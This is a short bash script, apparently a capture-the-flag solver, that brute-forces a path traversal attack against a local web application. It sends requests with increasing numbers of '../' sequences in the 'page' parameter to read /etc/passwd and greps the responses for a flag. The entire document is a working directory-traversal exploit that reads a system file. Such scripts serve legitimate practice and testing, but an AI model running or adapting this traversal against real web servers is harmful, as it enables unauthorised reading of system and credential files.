#!/bin/bash

for depth in $(seq 1 15); do
    payload=$(printf '../%.0s' $(seq 1 $depth))
    response=$(curl -s "http://localhost:8080/?page=${payload}etc/passwd")

    if echo "$response" | grep -qi "flag"; then
        echo "FLAG FOUND at depth $depth!"
        echo "$response" | grep -i flag
        break
    elif echo "$response" | grep -qi "almost"; then
        echo "Depth $depth: Almost!"
    else
        echo "Depth $depth: Nope"
    fi
done